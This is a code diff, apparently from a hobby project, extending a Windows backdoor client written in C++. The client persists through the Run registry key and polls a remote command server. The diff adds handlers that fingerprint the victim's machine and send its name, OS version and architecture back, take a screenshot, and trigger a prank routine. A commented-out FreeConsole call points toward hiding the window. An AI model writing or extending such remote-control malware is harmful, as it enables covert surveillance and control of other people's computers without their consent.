@@ -16,12 +16,17 @@
 #pragma comment (lib, "Ws2_32.lib")
 #pragma comment (lib, "Mswsock.lib")
 #pragma comment (lib, "AdvApi32.lib")
+#pragma comment(lib, "user32.lib")
+#pragma comment(lib, "Gdi32.lib")
 
 unsigned int G_UID;
+TCHAR ID[64];
+OSVERSIONINFOEX info;
 
 #include "net.h"
 #include "fingerprint.h"
 #include "fs.h"
+#include "utils.h"
 
 #define HKEY_PATH "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 
@@ -33,20 +38,40 @@ void addToBoot(TCHAR *szPath) {
   RegCloseKey(newValue);
 }
 
+SOCKET sock;
 void handle(char *buff, BOOL *listen, BOOL *loop) {
   if (strcmp(buff, "close") == 0) {
     *listen = FALSE;
     *loop = FALSE;
   } else if (strcmp(buff, "hi") == 0) {
-    printf("helloooooooo\n");
+    utils::fireHax0r();
+  } else if (strcmp(buff, "systeminfo") == 0) {
+    char str[256];
+    sprintf(str, "{name: \"%s\", version: \"%d.%d b.%d\", os: \"%s\", arch: %d}",
+        fingerprint::getMachineName(),
+        info.dwMajorVersion,
+        info.dwMinorVersion,
+        info.dwBuildNumber,
+        ID,
+        fingerprint::is64bits() ? 64 : 32);
+
+    net::PACKET * pck = net::newPacket(str);
+    net::write(&sock, pck);
+    free(pck);
+  } else if (strcmp(buff, "screenshot") == 0) {
+    char *ss = utils::TakeScreenShot((char*)"C:\\img.bmp");
+
+    net::PACKET * pck = net::newPacket((char*)"{screenshot: \"done\"}");
+    net::write(&sock, pck);
+    free(pck);
   }
 }
 
 int main() {
+  // FreeConsole();
   G_UID = fingerprint::getUID();
 
-  OSVERSIONINFOEX info = fingerprint::getOSInfo();
-  TCHAR ID[64];
+  info = fingerprint::getOSInfo();
   fingerprint::reconOS(ID, &info);
 
   TCHAR exePath[MAX_PATH];
@@ -68,7 +93,6 @@ int main() {
   char buf[BUFFER_LENGTH];
   int buffc;
 
-  SOCKET sock;
   while (run) {
     net::createSocket(&sock);
     if (net::connect(&sock) == 0) {
